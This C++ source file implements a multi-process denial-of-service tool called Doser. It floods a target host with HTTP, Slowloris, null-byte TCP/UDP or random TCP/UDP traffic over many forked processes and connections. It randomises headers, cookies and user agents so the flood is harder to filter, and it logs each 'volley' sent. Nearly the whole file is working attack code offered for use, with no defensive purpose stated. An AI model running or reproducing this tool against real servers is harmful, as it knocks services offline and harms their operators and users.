#include <random>
#include <chrono>
#include <netdb.h>
#include <cstring>
#include <csignal>
#include <utility>
#include <unistd.h>
#include <iostream>
#include <algorithm>
#include "Doser.h"


void Doser::attack(const int *id){
    int x, r;
    std::vector<int> sockets;
    std::vector<bool> packets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    if(conf->UseSSL){
        for (x = 0; x < conf->CONNECTIONS; x++) {
            SSLs.push_back(nullptr);
            CTXs.push_back(nullptr);
        }
    }
    for (x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        packets.push_back(false);
    }
    signal(SIGPIPE, &Doser::broke);
    while(true) {
        static std::string message;
        for (x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                if(conf->UseSSL){
                    CTXs[x] = InitCTX();
                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                }
                packets[x] = false;
            }
            if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
                if(conf->UseSSL){
                    r = write_socket(SSLs[x], "\0", 1);
                }else{
                    r = write_socket(sockets[x], "\0", 1);
                }
            }else{
                std::string packet = craft_packet(packets[x]);
                if(conf->UseSSL){
                    r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()));
                }else{
                    r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
                }
                packets[x] = true;
            }
            if(conf->GetResponse){
                if(conf->UseSSL){
                    read_socket(SSLs[x]);
                }else{
                    read_socket(sockets[x]);
                }
            }
            if(r == -1){
                if(conf->UseSSL){
                    cleanup(SSLs[x], &sockets[x], CTXs[x]);
                }else{
                    cleanup(&sockets[x]);
                }
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                if(conf->UseSSL){
                    CTXs[x] = InitCTX();
                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                }
                packets[x] = false;
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        if(conf->vector == config::Slowloris){
            usleep(10000000);
        }else{
            usleep(30000);
        }

    }
}
int Doser::make_socket(const char *host, const char *port) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    std::string message = std::string("Connecting-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    switch (conf->protocol){
        case config::TCP:
            hints.ai_socktype = SOCK_STREAM;
            break;
        case config::UDP:
            hints.ai_socktype = SOCK_DGRAM;
            break;
        default:break;
    }

    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
        logger->Log(&message, Logger::Error);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        logger->Log("No connection could be made", Logger::Error);
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    message = std::string("Connected-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    return sock;
}

void Doser::broke(int) {
    // Pass
}

std::string Doser::createStr() {
    int string_length =  randomInt(0, 20) + 1;
    std::string string{};
    for(int i = 0; i < string_length; ++i){
        string += (static_cast<char>('0' + randomInt(0, 72)));
    }
    return string;
}

void Doser::run() {
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case config::HTTP:
            logger->Log("Attack Vector: HTTP", Logger::Info);
            break;
        case config::NullTCP:
            logger->Log("Attack Vector: NullTCP", Logger::Info);
            break;
        case config::NullUDP:
            logger->Log("Attack Vector: NullUDP", Logger::Info);
            break;
        case config::UDPFlood:
            logger->Log("Attack Vector: UDPFlood", Logger::Info);
            break;
        case config::TCPFlood:
            logger->Log("Attack Vector: TCPFlood", Logger::Info);
            break;
        case config::Slowloris:
            logger->Log("Attack Vector: Slowloris", Logger::Info);
            break;
        default:break;
    }
    if(conf->UseSSL){
        logger->Log("SSL Enabled", Logger::Info);
    }
    if(conf->RandomizeHeader){
        logger->Log("Header Randomization Enabled", Logger::Info);
    }
    if(conf->RandomizeUserAgent){
        logger->Log("Useragent Randomization Enabled", Logger::Info);
    }
    logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);
    for (int x = 0; x < conf->THREADS; x++) {
        switch (fork()){
            case 0:break;
            default:
                attack(&x);
        }
        usleep(200000);
    }
}

Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {

}

std::string Doser::randomizeUserAgent(){
    if(conf->useragents.size() > 1){
        return conf->useragents[randomInt(0, static_cast<int>(conf->useragents.size()))];
    }
    return conf->useragents[0];
}

void Doser::read_socket(int socket){
    char chunk[128];
    while(read(socket , chunk, 128)){
        memset(chunk , 0 , 128);
    }
}

void Doser::read_socket(SSL *ssl) {
    char chunk[128];
    while(SSL_read(ssl , chunk, 128)){
        memset(chunk , 0 , 128);
    }
}

int Doser::write_socket(int socket, const char *string, int length){
    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
}
int Doser::write_socket(SSL *ssl, const char* string, int length){
    return (SSL_write(ssl, string, length));
}

std::string Doser::craft_packet(bool keep_alive){
    std::string packet{};
    shuffle(std::begin(encoding), std::end(encoding), std::mt19937(std::random_device()()));
    shuffle(std::begin(caching), std::end(caching), std::mt19937(std::random_device()()));
    shuffle(std::begin(charset), std::end(charset), std::mt19937(std::random_device()()));
    shuffle(std::begin(contenttype), std::end(contenttype), std::mt19937(std::random_device()()));
    shuffle(std::begin(methods), std::end(methods), std::mt19937(std::random_device()()));
    shuffle(std::begin(referer), std::end(referer), std::mt19937(std::random_device()()));
    switch(conf->vector){
        case config::UDPFlood:
        case config::TCPFlood:
            return createStr();
        case config::HTTP:{
           packet += methods[0] + " /";
            if(conf->RandomizeHeader){
                packet += createStr();
            }
            packet += " HTTP/1.0\r\nUser-Agent: ";
            if(conf->RandomizeUserAgent){
                packet += randomizeUserAgent();
            }else{
                packet += conf->useragents[0];
            }
            packet += " \r\nCache-Control: " + caching[0]
                      + " \r\nAccept-Encoding: " + encoding[0]
                      + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                      + " \r\nReferer: " + referer[0]
                      + " \r\nAccept: */*\r\nConnection: Keep-Alive"
                      + " \r\nContent-Type: " + contenttype[0]
                      + " \r\nCookie: " + createStr() + "=" + createStr()
                      + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
                      + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                      + "\r\n\r\n";
            return packet;
        }
        case config::Slowloris:{
            if(keep_alive){
                packet += "X-a: "
                          + std::to_string(randomInt(1, 5000))
                          + " \r\n";
            }else{
                packet += methods[0] + " /";
                if(conf->RandomizeHeader){
                    packet += createStr();
                }
                packet += " HTTP/1.0\r\nUser-Agent: ";
                if(conf->RandomizeUserAgent){
                    packet += randomizeUserAgent();
                }else{
                    packet += conf->useragents[0];
                }
                packet += " \r\nCache-Control: " + caching[0]
                          + " \r\nAccept-Encoding: " + encoding[0]
                          + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                          + " \r\nReferer: " + referer[0]
                          + " \r\nContent-Type: " + contenttype[0]
                          + " \r\nCookie: " + createStr() + "=" + createStr()
                          + " \r\nAccept: */*"
                          + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                          + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                          + " \r\n";
            }
            return packet;
        }
        default:
            return "";
    }
}

int Doser::randomInt(int min, int max){
    unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
    std::default_random_engine engine(seed);
    std::uniform_int_distribution<int> distribution(min, max);
    return distribution(engine);
}

SSL_CTX *Doser::InitCTX() {
    const SSL_METHOD *method{SSLv3_client_method()};
    SSL_CTX *ctx;
    OpenSSL_add_ssl_algorithms();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(method);
    if (ctx == nullptr){
        logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

SSL *Doser::Apply_SSL(int socket, SSL_CTX *ctx){
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, socket);
    if(SSL_connect(ssl) == -1){
        logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ssl;
}

void Doser::cleanup(const int *socket) {
    close(*socket);
}

void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
    SSL_free(ssl);
    close(*socket);
    SSL_CTX_free(ctx);
}

void Doser::attack_icmp(const int *id) {

}
